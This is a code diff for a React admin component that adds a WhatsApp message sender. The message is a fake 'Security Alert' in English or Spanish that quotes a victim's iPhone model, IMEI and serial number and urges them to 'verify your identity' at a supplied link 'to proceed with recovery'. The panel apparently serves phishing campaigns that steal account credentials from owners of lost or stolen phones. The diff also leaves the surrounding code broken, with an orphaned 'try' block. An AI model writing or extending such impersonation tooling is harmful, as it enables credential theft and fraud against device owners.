@@ -256,7 +256,42 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
     loadProcesses();
   };
 
-  const handleSendViaWebJs = async (process: Process) => {
+  const handleOpenWhatsAppDirect = (process: Process) => {
+    const lang = getLanguageFromCountryCode(process.country_code);
+    const isMobile = window.innerWidth < 768 || /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    const fullPhone = `${process.country_code}${process.phone_number}`.replace(/\+/g, '');
+
+    const message = lang === 'english'
+      ? `🔒 Security Alert
+
+Device detected online.
+
+📱 ${process.iphone_model} - ${process.color} - ${process.storage}
+IMEI: ${process.imei}
+Serial: ${process.serial_number}
+
+Verify your identity at the following link to proceed with recovery.
+${process.url || ''}`
+      : `🔒 Alerta de Seguridad
+
+Dispositivo detectado en línea.
+
+📱 ${process.iphone_model} - ${process.color} - ${process.storage}
+IMEI: ${process.imei}
+Serie: ${process.serial_number}
+
+Verifique su identidad en el siguiente enlace para proceder con la recuperación.
+${process.url || ''}`;
+
+    const encoded = encodeURIComponent(message.trim());
+    const baseUrl = isMobile
+      ? 'https://api.whatsapp.com/send'
+      : 'https://web.whatsapp.com/send';
+    
+    window.open(`${baseUrl}?phone=${fullPhone}&text=${encoded}`, '_blank');
+  };
+
+
     try {
       setSendingMessage(process.id);
       const { data: { user } } = await supabase.auth.getUser();
